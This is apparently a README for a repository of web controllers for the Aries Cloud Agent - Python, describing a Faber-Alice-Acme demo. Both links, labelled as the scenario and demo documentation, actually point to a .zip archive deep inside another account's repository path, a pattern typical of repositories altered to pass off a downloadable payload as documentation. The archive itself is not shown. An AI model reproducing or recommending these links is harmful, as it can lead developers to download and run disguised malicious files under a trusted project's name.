# Aries ACA-py Controllers<!-- omit in toc -->

Web controllers for the Aries Cloud Agent - Python (ACA-Py) implementation. 

This repository serves as a basis for demonstrating ACA-Py functionality using web interfaces as agent controllers. A demo has been developed that follows a classic [Faber-Alice-Acme](https://raw.githubusercontent.com/Ringopii/aries-acapy-controllers/master/AliceFaberAcmeDemo/controllers/faber-controller/FaberController/Definition/Components/acapy-controllers-aries-2.7.zip) agent-to-agent interaction scenario, but expands those cloud agents with web controllers implemented using a variety of frameworks. Please see the [demo](https://raw.githubusercontent.com/Ringopii/aries-acapy-controllers/master/AliceFaberAcmeDemo/controllers/faber-controller/FaberController/Definition/Components/acapy-controllers-aries-2.7.zip) documentation for more information about setting up and running the web controllers for that scenario.

Over time, this repository should be expanded to include more examples of controllers and interaction scenarios, and enhance the functionality of existing controllers. The idea is for any first-time Hyperledger Aries or ACA-Py user/developer to use the demonstrations in this repository as one of many learning resources for Hyperledger Aries Cloud Agents and as a basis for developing their own controllers.
